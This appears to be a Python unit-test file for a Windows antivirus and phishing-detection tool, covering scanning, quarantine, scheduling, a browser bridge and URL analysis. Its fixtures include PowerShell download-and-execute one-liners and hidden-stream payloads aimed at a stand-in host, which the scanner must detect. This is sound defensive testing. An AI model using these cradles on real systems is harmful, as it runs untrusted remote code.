        self.assertEqual(sess["hw_id"], an.hardware_id())
        self.assertEqual(an.by_series("cpu_avg")["gaming"]["n_total"], 2)
        # a session from different hardware is excluded from comparisons
        other = dict(sess, hw_id="somebody-else", profile="eco")
        self.assertNotIn("eco", an.by_series("cpu_avg", [sess, other]))
        self.assertIn("1 run", an.confidence_note(an.by_series("cpu_avg")["gaming"]))


class ModeArtTests(unittest.TestCase):
    """The mode-card animations are illustrations only: fixed curves, labelled as such, never live measurements."""

    def test_curves_are_deterministic_bounded_and_match_the_legend(self):
        from sentinel import mode_art, optimizer
        for key in optimizer.PROFILES:
            for i in range(0, 11):
                x = i / 10
                ys = mode_art.curves(key, x)
                self.assertEqual(ys, mode_art.curves(key, x))
                self.assertEqual(len(ys), len(mode_art.LEGEND[key]))
                self.assertTrue(all(0 <= y <= 1 for y in ys), (key, x, ys))

    def test_every_mode_is_labelled_as_an_illustration(self):
        from sentinel import mode_art, optimizer
        self.assertEqual(mode_art.CONCEPT_MS, 1200)
        for key in optimizer.PROFILES:
            self.assertTrue(mode_art.DISCLAIMERS[key].startswith("Illustration of intended behavior"))
            self.assertIn("not", mode_art.DISCLAIMERS[key])
            self.assertTrue(mode_art.TITLES[key] and mode_art.CAPTIONS[key])
        self.assertLess(mode_art.curves("eco", 1.0)[0], mode_art.curves("eco", 0.0)[0])   # eco: demand falls

    def test_art_module_reads_no_system_data(self):
        import inspect
        from sentinel import mode_art
        src = inspect.getsource(mode_art)
        for banned in ("psutil", "subprocess", "cpu_percent", "virtual_memory"):
            self.assertNotIn(banned, src)


class SignatureTests(unittest.TestCase):
    """Authenticode lowers heuristic suspicion only where it is safe to."""

    def setUp(self):
        self.d = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.d, True)
        self.sc = Scanner(log=False)

    def test_valid_signature_offsets_program_heuristics(self):
        from sentinel.authenticode import has_valid_signature
        if not has_valid_signature(sys.executable):
            self.skipTest("this Python build is not Authenticode-signed")
        disguised = self.d / "photo.png"
        shutil.copy(sys.executable, disguised)
        r = self.sc.scan_file(disguised)
        self.assertEqual(r.verdict, CLEAN, r.reasons)
        self.assertTrue(any("digital signature" in x for x in r.reasons))

    def test_signature_never_excuses_a_double_extension(self):
        f = self.d / "invoice.pdf.exe"
        shutil.copy(sys.executable, f)
        self.assertNotEqual(self.sc.scan_file(f).verdict, CLEAN)

    def test_tampered_signature_gives_no_reduction(self):
        f = self.d / "photo.png"
        b = bytearray(Path(sys.executable).read_bytes())
        b[len(b) // 2] ^= 0xFF
        f.write_bytes(bytes(b))
        r = self.sc.scan_file(f)
        self.assertNotEqual(r.verdict, CLEAN)
        self.assertFalse(any("digital signature" in x for x in r.reasons))

    def test_office_recent_shortcuts_are_not_double_extensions(self):
        recent = self.d / "AppData" / "Roaming" / "Microsoft" / "Word" / "Case123"
        recent.mkdir(parents=True)
        lnk = recent / "Case_Study.docx.lnk"
        lnk.write_bytes(b"L\x00\x00\x00" + b"\x00" * 60)
        self.assertEqual(self.sc.scan_file(lnk).verdict, CLEAN)
        elsewhere = self.d / "Downloads"
        elsewhere.mkdir()
        trap = elsewhere / "Case_Study.docx.lnk"
        trap.write_bytes(b"L\x00\x00\x00" + b"\x00" * 60)
        self.assertNotEqual(self.sc.scan_file(trap).verdict, CLEAN)


class ScheduleTests(unittest.TestCase):
    """Task Scheduler is simulated: these tests never register a real task."""

    def setUp(self):
        from sentinel import schedule
        self.s = schedule
        self.calls, self.tasks = [], {}
        self._real = schedule._schtasks
        import subprocess

        def fake(*args):
            self.calls.append(args)
            if args[0] == "/Create":
                self.tasks[args[2]] = args[4]
                return subprocess.CompletedProcess(args, 0, "SUCCESS", "")
            if args[0] == "/Query":
                if args[2] not in self.tasks:
                    return subprocess.CompletedProcess(args, 1, "", "ERROR: not found")
                return subprocess.CompletedProcess(args, 0, f"TaskName: \\{args[2]}\nNext Run Time: 11/8/2026 3:30:00 AM\n"
                                                            f"Task To Run: {self.tasks[args[2]]}\n", "")
            if args[0] == "/Delete":
                self.tasks.pop(args[2], None)
            return subprocess.CompletedProcess(args, 0, "SUCCESS", "")
        schedule._schtasks = fake
        self.addCleanup(setattr, schedule, "_schtasks", self._real)

    def test_daily_and_weekly_tasks_are_built_and_verified(self):
        ok, msg = self.s.create("3:30")
        self.assertTrue(ok, msg)
        args = self.calls[0]
        self.assertEqual(args[args.index("/ST") + 1], "03:30")
        self.assertEqual(args[args.index("/SC") + 1], "DAILY")
        self.assertIn("quickscan --scheduled", args[args.index("/TR") + 1])
        self.assertIn("every day at 03:30", msg)
        self.assertTrue(self.s.describe().startswith("Quick scan, next run"))
        ok, msg = self.s.create("22:05", "fullscan", "fri")
        args = self.calls[-2]
        self.assertEqual((args[args.index("/SC") + 1], args[args.index("/D") + 1]), ("WEEKLY", "FRI"))
        self.assertTrue(self.s.describe().startswith("Full PC scan"))

    def test_bad_input_is_rejected_before_touching_task_scheduler(self):
        for at, kind, day in (("25:00", "quickscan", None), ("noon", "quickscan", None), ("10:00", "rm", None),
                              ("10:00", "quickscan", "funday")):
            ok, _ = self.s.create(at, kind, day)
            self.assertFalse(ok)
        self.assertEqual(self.calls, [])

    def test_off_removes_the_task(self):
        self.s.create("10:00")
        self.assertTrue(self.s.remove()[0])
        self.assertEqual(self.s.describe(), "Off")
        self.assertTrue(self.s.remove()[0])                    # already off: still fine

    def test_task_command_is_quoted_and_windowless(self):
        cmd = self.s.task_command("quickscan")
        self.assertTrue(cmd.startswith('"'))
        self.assertIn('main.py" quickscan --scheduled', cmd)
        if Path(sys.executable).with_name("pythonw.exe").exists():
            self.assertIn("pythonw.exe", cmd)

    def test_unattended_result_is_saved_and_alert_only_when_needed(self):
        shown = []
        import ctypes
        real = ctypes.windll.user32.MessageBoxW if sys.platform == "win32" else None
        if real is None:
            self.skipTest("Windows only")
        ctypes.windll.user32.MessageBoxW = lambda *a: shown.append(a) or 1
        try:
            st = type("S", (), {"files": 10, "cached": 2, "threats": 0, "elapsed": 1.25})()
            self.s.save_result("quickscan", st, [])
            self.s.notify(0)
            self.assertEqual(shown, [])
            self.s.notify(2)
            self.assertEqual(len(shown), 1)
            self.assertIn("2 item(s)", shown[0][1])
        finally:
            ctypes.windll.user32.MessageBoxW = real
        self.assertEqual(self.s.last_result()["files"], 10)


class NativeHostTests(unittest.TestCase):
    """The browser bridge, tested with the real host process. Registry work uses a scratch HKCU key only."""
    REG = r"Software\XSecureTest\NativeHosts"
    ROOT = Path(__file__).resolve().parent.parent

    def setUp(self):
        from sentinel import nativehost
        self.nh = nativehost
        self.d = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.d, True)
        self.bad = self.d / "invoice.pdf.exe"
        self.bad.write_bytes(b"MZ" + b"\0" * 200)

    def tearDown(self):
        import winreg
        for sub in ("chrome", "edge", ""):
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, self.REG + "\\" + self.nh.HOST_NAME)
            except OSError:
                pass
        for k in (self.REG, r"Software\XSecureTest"):
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, k)
            except OSError:
                pass

    @staticmethod
    def frame(obj):
        import json as _j
        import struct as _s
        b = _j.dumps(obj).encode()
        return _s.pack("<I", len(b)) + b

    @staticmethod
    def unframe(data):
        import json as _j
        import struct as _s
        out = []
        while len(data) >= 4:
            (n,) = _s.unpack("<I", data[:4])
            out.append(_j.loads(data[4:4 + n]))
            data = data[4 + n:]
        return out

    def test_protocol_and_validation(self):
        import io
        reqs = [{"type": "ping"}, {"type": "scan", "path": str(self.bad)}, {"type": "scan", "path": "relative.exe"},
                {"type": "scan", "path": str(self.d)}, {"type": "scan", "path": str(self.d / "missing.exe")},
                {"type": "launch", "path": str(self.bad)}]
        out = io.BytesIO()
        self.assertEqual(self.nh.serve(io.BytesIO(b"".join(self.frame(r) for r in reqs)), out), 0)
        ping, scan, rel, folder, missing, launch = self.unframe(out.getvalue())
        self.assertTrue(ping["ok"])
        self.assertTrue(scan["ok"])
        self.assertNotEqual(scan["verdict"], "clean")
        self.assertEqual(scan["name"], "invoice.pdf.exe")
        for bad in (rel, folder, missing, launch):
            self.assertFalse(bad["ok"])
        self.assertTrue(self.bad.exists())                       # the host never moves or deletes anything

    def test_oversized_message_is_refused(self):
        import io
        import struct as _s
        out = io.BytesIO()
        self.assertEqual(self.nh.serve(io.BytesIO(_s.pack("<I", 50 << 20)), out), 1)
        self.assertFalse(self.unframe(out.getvalue())[0]["ok"])

    def _talk(self, cmd, reqs):
        import subprocess
        p = subprocess.run(cmd, input=b"".join(self.frame(r) for r in reqs), capture_output=True, timeout=120,
                           env={**os.environ, "XSECURE_HOME": str(self.d / "home")})
        return self.unframe(p.stdout), p

    def test_real_host_process(self):
        replies, p = self._talk([sys.executable, str(self.ROOT / "main.py"), "nativehost", "serve",
                                 "chrome-extension://abcdefghijklmnopabcdefghijklmnop/"],
                                [{"type": "ping"}, {"type": "scan", "path": str(self.bad)}])
        self.assertEqual(len(replies), 2, p.stderr)
        self.assertTrue(replies[0]["ok"])
        self.assertIn(replies[1]["verdict"], ("suspicious", "malicious"))

    def test_install_launcher_and_uninstall(self):
        os.environ["XSECURE_HOME"], old = str(self.d / "home"), os.environ.get("XSECURE_HOME")
        try:
            import importlib
            from sentinel import config as cfg
            with self.assertRaises(ValueError):
                self.nh.install(["not-an-id"], browsers=("chrome",), reg_base=self.REG)
            ext_id = "abcdefghijklmnopabcdefghijklmnop"
            done = self.nh.install([ext_id], browsers=("chrome",), reg_base=self.REG)
            self.assertEqual(len(done), 1)
            man_path = self.nh.status(("chrome",), reg_base=self.REG)["chrome"]
            man = __import__("json").loads(Path(man_path).read_text(encoding="utf-8"))
            self.assertEqual(man["name"], self.nh.HOST_NAME)
            self.assertEqual(man["allowed_origins"], [f"chrome-extension://{ext_id}/"])
            launcher = Path(man["path"])
            self.assertTrue(launcher.is_file())
            replies, p = self._talk(["cmd", "/c", str(launcher), f"chrome-extension://{ext_id}/"],
                                    [{"type": "ping"}, {"type": "scan", "path": str(self.bad)}])
            self.assertEqual(len(replies), 2, p.stderr)               # the exact program the browser starts
            self.assertNotEqual(replies[1]["verdict"], "clean")
            self.assertEqual(self.nh.uninstall(("chrome",), reg_base=self.REG), ["chrome"])
            self.assertIsNone(self.nh.status(("chrome",), reg_base=self.REG)["chrome"])
            self.assertFalse(launcher.exists())
        finally:
            if old is None:
                os.environ.pop("XSECURE_HOME", None)
            else:
                os.environ["XSECURE_HOME"] = old

    def test_extension_sends_finished_downloads_to_the_host(self):
        """Runs the extension's real background.js in Node with a mocked browser API whose sendNativeMessage
        starts the real host process."""
        node = shutil.which("node")
        if not node:
            self.skipTest("Node.js not installed")
        ext = self.ROOT / "browser_extension"
        harness = self.d / "harness.js"
        harness.write_text("""
const fs = require("fs"), path = require("path"), cp = require("child_process"), vm = require("vm");
const EXT = process.argv[2], PY = process.argv[3], MAIN = process.argv[4], FILE = process.argv[5];
const listeners = {}, notes = [];
const ev = (name) => ({ addListener: (fn) => { listeners[name] = fn; } });
function frame(o) { const b = Buffer.from(JSON.stringify(o)); const h = Buffer.alloc(4); h.writeUInt32LE(b.length); return Buffer.concat([h, b]); }
const chrome = {
  runtime: { getURL: (p) => "file://" + path.join(EXT, p), onMessage: ev("msg"), lastError: null,
    sendNativeMessage: (host, msg, cb) => {
      const out = cp.execFileSync(PY, [MAIN, "nativehost", "serve"], { input: frame(msg) });
      const n = out.readUInt32LE(0); cb(JSON.parse(out.slice(4, 4 + n).toString()));
    } },
  webNavigation: { onBeforeNavigate: ev("nav") }, storage: { session: { get: async () => ({}) } },
  downloads: { onCreated: ev("created"), onChanged: ev("changed"),
               search: async ({ id }) => [{ id, filename: FILE }] },
  notifications: { create: (id, opt) => notes.push(opt) }, tabs: { update() {} }, action: {},
};
const ctx = { chrome, console, URL, fetch: async () => ({ json: async () => ({ domains: [] }) }) };
ctx.importScripts = (f) => vm.runInContext(fs.readFileSync(path.join(EXT, f), "utf8"), ctx);
vm.createContext(ctx);
vm.runInContext(fs.readFileSync(path.join(EXT, "background.js"), "utf8"), ctx);
(async () => {
  await listeners.changed({ id: 7, state: { current: "in_progress" } });
  const before = notes.length;
  await listeners.changed({ id: 7, state: { current: "complete" } });
  console.log(JSON.stringify({ before, notes }));
})();
""", encoding="utf-8")
        import json as _j
        import subprocess
        p = subprocess.run([node, str(harness), str(ext), sys.executable, str(self.ROOT / "main.py"), str(self.bad)],
                           capture_output=True, text=True, timeout=120,
                           env={**os.environ, "XSECURE_HOME": str(self.d / "home")})
        self.assertEqual(p.returncode, 0, p.stderr)
        res = _j.loads(p.stdout.strip().splitlines()[-1])
        self.assertEqual(res["before"], 0)                       # nothing until the download completes
        self.assertEqual(len(res["notes"]), 1)
        self.assertIn("X-Secure:", res["notes"][0]["title"])
        self.assertIn("invoice.pdf.exe", res["notes"][0]["message"])


@unittest.skipUnless(sys.platform == "win32", "NTFS alternate data streams are Windows-only")
class AlternateStreamTests(unittest.TestCase):
    def setUp(self):
        self.d = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.d, True)
        self.sc = Scanner(log=False)

    def write(self, name, data, stream=None):
        f = self.d / name
        if not f.exists():
            f.write_text("ordinary notes\n")
        if stream:
            with open(f"{f}:{stream}", "wb") as h:
                h.write(data)
        return f

    def test_program_hidden_in_a_stream_is_found(self):
        f = self.write("notes.txt", b"MZ" + b"\0" * 300, "payload.exe")
        from sentinel import ads
        self.assertIn(("payload.exe", 302), ads.list_streams(f))
        r = self.sc.scan_file(f)
        self.assertNotEqual(r.verdict, CLEAN)
        self.assertTrue(any("payload.exe" in x and "hidden program" in x for x in r.reasons), r.reasons)

    def test_script_hidden_in_a_stream_is_found(self):
        f = self.write("readme.txt", b"IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')\n"
                                     b"powershell -w hidden -enc " + b"QUJD" * 10, "run.ps1")
        self.assertNotEqual(self.sc.scan_file(f).verdict, CLEAN)

    def test_normal_streams_are_ignored(self):
        f = self.write("setup_notes.txt", b"[ZoneTransfer]\r\nZoneId=3\r\nHostUrl=https://example.com/\r\n",
                       "Zone.Identifier")
        self.write("setup_notes.txt", b"just a harmless comment", "comment")
        r = self.sc.scan_file(f)
        self.assertEqual(r.verdict, CLEAN, r.reasons)
        from sentinel import ads
        self.assertEqual([n for n, _ in ads.suspicious_streams(f)], ["comment"])   # listed, but harmless


class PublicSuffixTests(unittest.TestCase):
    def setUp(self):
        config.ensure_dirs()
        self.f = config.UPDATED_SIGS_DIR / "public_suffix_list.dat"
        body = ["// ===BEGIN ICANN DOMAINS===", "com", "uk", "co.uk", "au", "com.au", "jp", "*.ck", "!www.ck",
                "xn--p1ai"] + [f"filler{i}.test" for i in range(1100)] + [
               "// ===END ICANN DOMAINS===", "// ===BEGIN PRIVATE DOMAINS===", "github.io", "s3.amazonaws.com"]
        self.f.write_text("\n".join(body), encoding="utf-8")
        webguard._psl.cache_clear()

    def tearDown(self):
        self.f.unlink(missing_ok=True)
        webguard._psl.cache_clear()

    def test_registered_domains_follow_the_list(self):
        rd = webguard.registered_domain
        self.assertEqual(rd("a.b.example.co.uk"), "example.co.uk")
        self.assertEqual(rd("shop.example.com.au"), "example.com.au")
        self.assertEqual(rd("login.paypal.com"), "paypal.com")
        self.assertEqual(rd("x.site.foo.ck"), "site.foo.ck")          # wildcard rule *.ck
        self.assertEqual(rd("www.ck"), "www.ck")                       # exception rule !www.ck
        self.assertEqual(rd("a.b.unknown-tld"), "b.unknown-tld")       # no rule: default is the last label
        self.assertEqual(rd("co.uk"), "co.uk")
        # private-section entries are ignored on purpose (shared hosting stays under brand checks)
        self.assertEqual(rd("evil.s3.amazonaws.com"), "amazonaws.com")
        self.assertNotEqual(webguard.analyze_url("https://evil.s3.amazonaws.com/paypal/login").verdict, "clean")

    def test_falls_back_without_the_list(self):
        self.f.unlink()
        webguard._psl.cache_clear()
        self.assertEqual(webguard.registered_domain("a.b.example.co.uk"), "example.co.uk")
        self.assertEqual(webguard.registered_domain("a.example.com"), "example.com")


class DownloadCradleTests(unittest.TestCase):
    """Regression (found by `main.py benchmark`): a bare download-and-run one-liner used to score 30 = clean."""

    def setUp(self):
        self.d = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.d, True)
        self.sc = Scanner(log=False)

    def verdict(self, name, data):
        f = self.d / name
        f.write_bytes(data)
        return self.sc.scan_file(f).verdict

    def test_cradles_are_flagged_in_any_form(self):
        for i, src in enumerate([
                "IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')",
                'iex(New-Object System.Net.WebClient).DownloadString("http://x.test/a")',
                "irm https://x.test/i.ps1 | iex",
                "(New-Object Net.WebClient).DownloadString('http://x.test') | Invoke-Expression",
                "Invoke-Expression (Invoke-WebRequest http://x.test/a).Content"]):
            self.assertNotEqual(self.verdict(f"c{i}.ps1", src.encode()), CLEAN, src)
            self.assertNotEqual(self.verdict(f"u{i}.ps1", src.encode("utf-16")), CLEAN, "UTF-16: " + src)

    def test_downloading_or_iex_alone_is_not_flagged(self):
        self.assertEqual(self.verdict("dl.ps1", b"(New-Object Net.WebClient).DownloadFile('https://example.com/a.msi', 'a.msi')"), CLEAN)
        self.assertEqual(self.verdict("iex.ps1", b"$c = 'Get-Date'\nInvoke-Expression $c\n"), CLEAN)


class WebsiteTests(unittest.TestCase):
    """The portfolio site (docs/) must stay in step with the real extension logic."""
    ROOT = Path(__file__).resolve().parent.parent

    def test_site_checker_is_the_extension_checker(self):
        self.assertEqual((self.ROOT / "docs" / "analyzer.js").read_bytes(),
                         (self.ROOT / "browser_extension" / "analyzer.js").read_bytes(),
                         "copy browser_extension/analyzer.js to docs/analyzer.js")

    def test_demo_links_on_the_page_give_the_verdicts_the_page_promises(self):
        node = shutil.which("node")
        if not node:
            self.skipTest("Node.js not installed")
        import json
        import re
        import subprocess
        html = (self.ROOT / "docs" / "index.html").read_text(encoding="utf-8")
        urls = re.findall(r'data-u="([^"]+)"', html)
        self.assertGreaterEqual(len(urls), 5)
        script = Path(tempfile.mkdtemp()) / "t.js"
        script.write_text((self.ROOT / "docs" / "analyzer.js").read_text(encoding="utf-8") +
                          "\nconsole.log(JSON.stringify(" + json.dumps(urls) + ".map(u => analyzeUrl(u, []))));",
                          encoding="utf-8")
        out = json.loads(subprocess.run([node, str(script)], capture_output=True, text=True, timeout=60).stdout)
        verdicts = {u: v["verdict"] for u, v in zip(urls, out)}
        self.assertEqual(verdicts["https://github.com/login"], "clean")
        for u in urls:
            if u != "https://github.com/login":
                self.assertNotEqual(verdicts[u], "clean", u)
            self.assertEqual(verdicts[u], webguard.analyze_url(u).verdict, u)      # same as the Python engine

    def test_page_is_self_contained_and_leaks_nothing_personal(self):
        html = (self.ROOT / "docs" / "index.html").read_text(encoding="utf-8")
        self.assertNotRegex(html, r"https?://(?!github\.com/login|evil\.s3|www\.w3)[^\"' <]*\.(js|css)")
        self.assertNotIn("C:\\Users", html)
        for img in (self.ROOT / "docs" / "img").glob("*.png"):
            self.assertLess(img.stat().st_size, 400_000, img.name)


class ProcessWatcherTests(unittest.TestCase):
    def test_reused_pid_is_inspected_again(self):
        from sentinel import monitor

        class FakeProc:
            def __init__(self, pid, created):
                self.pid, self.info = pid, {"pid": pid, "create_time": created}

        class FakePsutil:
            Error = Exception
            procs = []

            @classmethod
            def process_iter(cls, attrs=None):
                return list(cls.procs)

        class StopAfter:
            def __init__(self, n):
                self.n = n

            def wait(self, _timeout):
                self.n -= 1
                return self.n < 0

        old = monitor.psutil
        monitor.psutil = FakePsutil
        try:
            w = monitor.ProcessWatcher(lambda a: None)
            seen = []
            w._inspect = lambda p: seen.append((p.pid, p.info["create_time"]))
            w._known = {(100, 1.0), (101, 1.0)}
            FakePsutil.procs = [FakeProc(100, 5.0), FakeProc(101, 1.0)]  # PID 100 reused by a new process
            w._stop = StopAfter(1)
            w._run()
            self.assertEqual(seen, [(100, 5.0)])
            self.assertEqual(w._known, {(100, 5.0), (101, 1.0)})
        finally:
            monitor.psutil = old


class UpdaterTests(unittest.TestCase):
    GOOD = "# Title: test list\n" + "\n".join(f"bad{i}.example-threat.test" for i in range(20)) + "\n"

    def setUp(self):
        from sentinel import updater
        self.u = updater
        self._fetch, self._env = updater._fetch, {k: os.environ.pop(k, None) for k in ("XSECURE_FEED_KEY",
                                                                                        "SENTINEL_FEED_KEY")}
        shutil.rmtree(config.UPDATED_SIGS_DIR / "feeds", ignore_errors=True)
        (config.UPDATED_SIGS_DIR / "bad_domains.txt").unlink(missing_ok=True)

    def tearDown(self):
        self.u._fetch = self._fetch
        for k, v in self._env.items():
            if v is not None:
                os.environ[k] = v
            else:
                os.environ.pop(k, None)
        shutil.rmtree(config.UPDATED_SIGS_DIR / "feeds", ignore_errors=True)
        (config.UPDATED_SIGS_DIR / "bad_domains.txt").unlink(missing_ok=True)
        from sentinel.webguard import _bad_domains
        _bad_domains.cache_clear()

    def test_parse_domains_accepts_lists_and_hosts_files_and_drops_junk(self):
        text = ("# comment\nevil.example.com\n0.0.0.0 tracker.bad.test  # trailing\n127.0.0.1 localhost\n"
                "<html>\nnot a domain\nxn--pypal-4ve.com\n")
        self.assertEqual(self.u.parse_domains(text), ["evil.example.com", "tracker.bad.test", "xn--pypal-4ve.com"])

    def test_one_failing_feed_never_wipes_the_others(self):
        urls = {url: slug for slug, (_l, url) in self.u.DOMAIN_FEEDS.items()}
        good_slug = "urlhaus"
        self.u._fetch = lambda url, *a, **k: self.GOOD if urls.get(url) == good_slug else "<html>410 Gone</html>"
        r = self.u.update_feeds()
        self.assertIn("20 domains", r["URLhaus malware domains"])
        self.assertIn("failed", r["Phishing Army phishing domains"])
        self.assertIn("skipped", r[self.u.HASH_LABEL])                  # no key: clearly skipped, not "failed"
        self.assertEqual(webguard.analyze_url("http://bad3.example-threat.test/").verdict, "malicious")
        # next run: every feed fails -> the last good list is kept and still used
        self.u._fetch = lambda url, *a, **k: "<html>error</html>"
        r = self.u.update_feeds()
        self.assertEqual(r["Bad-domain list in use"], "20 domains")
        self.assertEqual(webguard.analyze_url("http://bad3.example-threat.test/").verdict, "malicious")

    def test_hash_feed_uses_the_key_and_keeps_old_list_on_bad_answer(self):
        config.ensure_dirs()
        target = config.UPDATED_SIGS_DIR / self.u.HASH_FILE
        target.write_text("a" * 64 + "\n")
        os.environ["XSECURE_FEED_KEY"] = "test-key"
        seen = {}

        def fake(url, data=None, headers=None):
            if url == self.u.HASH_API:
                seen.update(headers or {}, **(data or {}))
                return '{"query_status": "unknown_auth_key"}'
            return self.GOOD
        self.u._fetch = fake
        r = self.u.update_feeds()
        self.assertEqual(seen.get("Auth-Key"), "test-key")
        self.assertEqual(seen.get("query"), "get_recent")
        self.assertIn("failed", r[self.u.HASH_LABEL])
        self.assertEqual(target.read_text(), "a" * 64 + "\n")
        self.u._fetch = lambda url, data=None, headers=None: (
            '{"query_status": "ok", "data": [{"sha256_hash": "' + "B" * 64 + '"}]}' if url == self.u.HASH_API
            else self.GOOD)
        r = self.u.update_feeds()
        self.assertEqual(r[self.u.HASH_LABEL], "1 hashes")
        self.assertEqual(target.read_text(), "b" * 64 + "\n")
        target.unlink()


class MonitorTests(unittest.TestCase):
    def test_ransom_extension_and_note_alerts(self):
        from sentinel.monitor import RansomwareGuard
        alerts = []
        g = RansomwareGuard(alerts.append)
        g.event(r"C:\data\report.docx.locked", "created")
        g.event(r"C:\data\other.txt.locked", "created")      # same folder+ext within 30s: suppressed
        g.event(r"C:\data\HOW_TO_DECRYPT_FILES.txt", "created")
        g.event(r"C:\data\report.docx", "modified")           # normal file: no alert
        self.assertEqual(len(alerts), 2)
        self.assertTrue(all(a.severity == "critical" for a in alerts))


class AuditHelperTests(unittest.TestCase):
    def test_parse_hosts(self):
        from sentinel.sysaudit import parse_hosts
        txt = "# comment\n127.0.0.1 localhost\n0.0.0.0 update.microsoft.com  # blocked\n\n"
        self.assertEqual(parse_hosts(txt), [("127.0.0.1", "localhost"), ("0.0.0.0", "update.microsoft.com")])

    def test_unquoted_service_path(self):
        from sentinel.sysaudit import is_unquoted_service_path as f
        self.assertTrue(f(r"C:\Program Files\App\svc.exe -k run"))
        self.assertFalse(f(r'"C:\Program Files\App\svc.exe" -k run'))
        self.assertFalse(f(r"C:\Windows\system32\svchost.exe -k netsvcs"))
        self.assertFalse(f(""))


class QuarantineTests(unittest.TestCase):
    def setUp(self):
        self.d = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.d, True)

    def test_round_trip_is_encrypted_with_no_key_stored(self):
        f = self.d / "evil.bin"
        data = os.urandom(9 * (1 << 20) + 123)  # spans several encryption chunks
        f.write_bytes(data)
        qid = quarantine.quarantine_file(f, "test", "abc")
        self.assertFalse(f.exists())
        stored = (config.QUARANTINE_DIR / f"{qid}.qz").read_bytes()
        self.assertNotIn(data[1000:1064], stored)
        item = quarantine.list_items()[0]
        if quarantine.available():
            self.assertEqual(item["format"], quarantine.FORMAT)
            self.assertNotIn("key", item)                       # nothing in the folder can decrypt it
        out = quarantine.restore(qid)
        self.assertEqual(out.read_bytes(), data)
        self.assertEqual(quarantine.list_items(), [])

    @unittest.skipUnless(quarantine.available(), "DPAPI is Windows-only")
    def test_tampered_or_swapped_files_are_never_restored(self):
        a, b = self.d / "a.bin", self.d / "b.bin"
        a.write_bytes(b"A" * 5000)
        b.write_bytes(b"B" * 5000)
        qa, qb = quarantine.quarantine_file(a), quarantine.quarantine_file(b)
        qa_path, qb_path = config.QUARANTINE_DIR / f"{qa}.qz", config.QUARANTINE_DIR / f"{qb}.qz"
        raw = bytearray(qa_path.read_bytes())
        raw[200] ^= 0xFF
        qa_path.write_bytes(bytes(raw))
        with self.assertRaises(OSError):
            quarantine.restore(qa)
        self.assertFalse(a.exists() or Path(str(a) + ".partial").exists())   # nothing half-written appears
        good_b = qb_path.read_bytes()
        qa_path.write_bytes(good_b)                              # swap: b's blob under a's id
        with self.assertRaises(OSError):
            quarantine.restore(qa)
        self.assertEqual(quarantine.restore(qb).read_bytes(), b"B" * 5000)
        quarantine.delete(qa)

    def test_old_xor_items_still_restore(self):
        f = self.d / "old.bin"
        data = os.urandom(5000)
        key = os.urandom(quarantine.KEY_LEN)
        qid = "legacy0000000000000000000000000001"
        config.ensure_dirs()
        f.write_bytes(data)
        quarantine._xor_stream(f, config.QUARANTINE_DIR / f"{qid}.qz", key)
        f.unlink()
        idx = quarantine._load()
        idx[qid] = {"original_path": str(f), "sha256": "", "reason": "", "time": time.time(), "size": 5000,
                    "key": key.hex()}
        quarantine._save(idx)
        self.assertEqual(quarantine.restore(qid).read_bytes(), data)


class WebGuardTests(unittest.TestCase):
    def test_legit(self):
        self.assertEqual(webguard.analyze_url("https://www.google.com/search?q=cats").verdict, "clean")
        self.assertEqual(webguard.analyze_url("https://github.com/login").verdict, "clean")

    def test_phishing(self):
        v = webguard.analyze_url("http://paypa1-secure-login.xyz/verify")
        self.assertNotEqual(v.verdict, "clean")

    def test_brand_subdomain(self):
        self.assertNotEqual(webguard.analyze_url("https://paypal.com.account-check.top/").verdict, "clean")

    def test_at_sign(self):
        self.assertNotEqual(webguard.analyze_url("http://192.168.1.1@evil.com/").verdict, "clean")

    def test_ip_login(self):
        self.assertNotEqual(webguard.analyze_url("http://185.1.2.3/login").verdict, "clean")

    def test_punycode_reason(self):
        v = webguard.analyze_url("http://xn--pypal-4ve.com/")
        self.assertTrue(any("Punycode" in r for r in v.reasons))

    def test_blocklist(self):
        self.assertEqual(webguard.analyze_url("http://sentinel-test-bad.test/").verdict, "malicious")


if __name__ == "__main__":
    unittest.main()
